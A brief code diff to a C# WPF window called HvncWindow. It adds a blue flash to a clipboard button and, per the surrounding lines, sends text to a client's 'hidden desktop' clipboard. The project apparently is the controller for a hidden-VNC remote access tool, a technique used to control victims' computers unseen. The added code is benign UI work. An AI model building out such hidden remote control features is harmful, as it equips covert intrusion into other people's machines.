@@ -163,6 +163,14 @@ public partial class HvncWindow : Window
         catch { text = ""; }
         if (string.IsNullOrEmpty(text)) return;
 
+        // Flash the clipboard button blue to signal success
+        BtnClipboard.Background = new System.Windows.Media.SolidColorBrush(
+            System.Windows.Media.Color.FromRgb(0x4A, 0x85, 0xF5));
+        var restore = BtnClipboard.Background;
+        var t = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromMilliseconds(500) };
+        t.Tick += (_, _) => { BtnClipboard.Background = System.Windows.Media.Brushes.Transparent; t.Stop(); };
+        t.Start();
+
         // 1. Send the text to the client's hidden desktop clipboard
         _ = _server.SendToClient(_clientId, new Packet
         {
